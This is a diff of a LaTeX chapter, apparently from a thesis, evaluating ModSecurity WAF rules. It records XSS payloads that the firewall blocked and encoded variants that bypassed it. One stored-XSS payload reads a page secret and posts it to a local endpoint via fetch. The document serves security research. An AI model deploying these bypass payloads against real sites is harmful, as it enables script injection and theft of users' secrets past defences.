@@ -4,11 +4,19 @@ This chapter states the evaluation results of multiple iterations of application
 
 \subsubsection{Percent encoding + Unicode in JSON}
 The ModSecurity firewall blocks requests containing unicode escaped characters in JSON. (see Section~\ref{sec:unicodeinjsontest})
-In order to evade this rule, a payload containing a unicode escaped character is percent-encoded previous to submission. The ModSecurity firewall detects the unicode escape regardless and rejects the request. (see Listing~\ref{lst:jsonunicodeurlenctest})
+In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
+The ModSecurity firewall detected the unicode escape regardless and rejects the request. (see Listing~\ref{lst:jsonunicodeurlenctest})
+
+
+\subsubsection{Double Percent encoding}
+The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
+On usage of double Percent encoding (Listing~\ref{lst:doublepercentencoding}), the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF.
+However, this payload would not be valid unless the target also performs multiple step url decoding.
 
 
 \subsubsection{HTML encoding + JavaScript normal character escape}
-The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}. It is blocked by the ModSecurity firewall based on 4 rule triggers:
+The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}.
+It was blocked by the ModSecurity firewall based on 4 rule triggers:
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
 <payload><a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a></payload>
 
@@ -33,9 +41,14 @@ The following payload could be used by an attacker intending to employ stored XS
 <MatchedData>"javascript:v"</MatchedData>
 \end{lstlisting}
 
-As the payload is meant to be injected into an html document, HTML escaping can be used to escape certain characters. On escaping of the character \verb|a| in \verb|j&#97vascript|, the payload evades the rules with ids \verb|941170| and \verb|941210|. On escaping the \verb|.| in \verb|getElementsByName('name')[0]&#46innerHTML|, the payload evades rule \verb|941180|. Finally one of the \verb|/| in the string given to the JavaScript function \verb|fetch| is escaped by prepending it with a \verb|\|. Escaping any normal character with a \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully makes the payload evade the last remaining rule: \verb|934110|. The bypassing payload:
+As the payload is meant to be injected into an html document, HTML escaping can be used to escape certain characters.
+On escaping of the character \verb|a| in \verb|j&#97vascript|, the payload evaded the rules with ids \verb|941170| and \verb|941210|.
+On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0]&#46innerHTML|, the payload evaded rule \verb|941180|.
+Finally one of the \verb|/| in the url-string given to the JavaScript function \verb|fetch| is escaped by prepending it with a \verb|\|.
+Escaping any normal character with a \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully made the payload evade the last remaining rule: \verb|934110|.
+The bypassing payload:
 
-\begin{lstlisting}[style=basicStyle]
+\begin{lstlisting}[style=basicStyle, caption=stored xss bypass payload]
 <a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
 \end{lstlisting}
 
@@ -43,7 +56,7 @@ As the payload is meant to be injected into an html document, HTML escaping can 
 \subsubsection{Function constructor + String concatenation}
 \label{sec:funconstrconbypass}
 In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
-The basic implementation is blocked by the ModSecurity firewall:
+The basic implementation was blocked by the ModSecurity firewall:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
 <payload>new Function('var s = "secret";prompt("something", s)')()</payload>
@@ -61,13 +74,14 @@ The basic implementation is blocked by the ModSecurity firewall:
 
 To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:
 
-\begin{lstlisting}[style=basicStyle]
+\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload]
 []['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
 \end{lstlisting}
 
 \subsubsection{Avoiding ()}
-In the context of testing firewall evasion techniques, the author faced the question if it was possible to create payloads without  \verb|()|. Those payloads need to be valid and bypass the waf. 
-Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and closing \verb|()| can be substituted with Tagged Template Literals. This causes another firewall rule to trigger:
+\label{sec:avoidingbypassA}
+In the context of testing firewall evasion techniques, the author faced the question if it was possible to create payloads without  \verb|()|. Those payloads still need to be valid and bypass the waf.
+Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and closing \verb|()| can be substituted with Tagged Template Literals. This caused another firewall rule to trigger:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () blocked, label={lst:avoiding () blocked}]
 <payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something${s}`'}```</payload>
@@ -78,28 +92,32 @@ Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and
 <MatchedData>"${s}`}"</MatchedData>
 \end{lstlisting}
 
-Evading rule \verb|932130| is possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s} was replaced with \verb|\u{0024}{s}|. The bypassing payload:
+Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:
 
-\begin{lstlisting}[style=basicStyle]
+\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload]
 []['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
 \end{lstlisting}
 
-It is conspicuous that the payload can bypass the firewall with only one \verb|$| of the placeholders \verb|${expression}| escaped.
+It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
 This seems to be a bug in the WAF or the ruleset.
 It is also what enables the above payload to be valid.
 A substitution of the earlier \verb|$| with an escaped variant is not possible.
 JavaScript does not recognize the placeholder in the Template Literal without the explicit character \verb|$|.
 Substitution of the second placeholder is possible because it happens inside a string containing the Tagged Template Literal.
 
-If the webserver is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69. 
+If the webserver is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69. In this case it was neccessary to use Percent encoding in addition to avoid that the WAF flags the Unicode escape sequences as \quotes{Possible Unicode character bypass detected}:
 
-
+\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using unicode normalization]
+urllib.parse.quote("[]['constructor']['constructor']`a\uFE69{'var s = \"secret\";promp' + 't`something\uFE69{s}`'}```")
+returns
+%5B%5D%5B%27constructor%27%5D%5B%27constructor%27%5D%60a%EF%B9%A9%7B%27var%20s%20%3D%20%22secret%22%3Bpromp%27%20%2B%20%27t%60something%EF%B9%A9%7Bs%7D%60%27%7D%60%60%60
+\end{lstlisting}
 % console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
 
 \subsubsection{Avoiding \{\}}
-A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace. The example payload in Listing~\ref{lst:stringreplaceblocked} is being blocked by the modsecurity firewall:
+A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:
 
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} example, label={lst:stringreplaceblocked}]
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} payload, label={lst:stringreplaceblocked}]
 <payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
 <message>"Remote Command Execution: Unix Shell Expression Found"</message>
 <file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
@@ -107,20 +125,17 @@ A payload thats not using any \verb|{}| but still allows for Tagged Template Lit
 <MatchedData>"${2 2}"</MatchedData>
 \end{lstlisting}
 
-If one uses a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
+On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
 
-\begin{lstlisting}[style=basicStyle, caption=string replace to evade {} detection, label={lst:stringreplacepass}]
+\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload, label={lst:stringreplacepass}]
 [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
 \end{lstlisting}
 
-successfully evades the firewall.
+successfully evaded the firewall.
 
 
-\subsubsection{Double Percent encoding}
-On usage of double url encoding (see Listing~\ref{lst:doubleurlencodedexample}), the above mentioned rule with message \quotes{Remote Command Execution: Unix Shell Expression Found} does no longer trigger. The characters \verb|alert(| still trigger \quotes{Javascript Method detected}. substituting \verb|alert()| with \verb|prompt()| and using a tagged template literal instead of calling with \verb|()| will allow to successfully pass a payload that evades detection and is able to display the template parameter. however, this payload would not be valid unless the target performs multiple step url decoding.
 
-\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doubleurlencodedexample}]
-encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)'))
-=
-alert(%2560%2524%257Bnew%2520Date()%257D%2560)
-\end{lstlisting}
+
+
+\subsubsection{Forcing unicode normalization}
+{\color{red} TODO: what happens if a string followed by .normalize('NFKC') is sent as payload?}
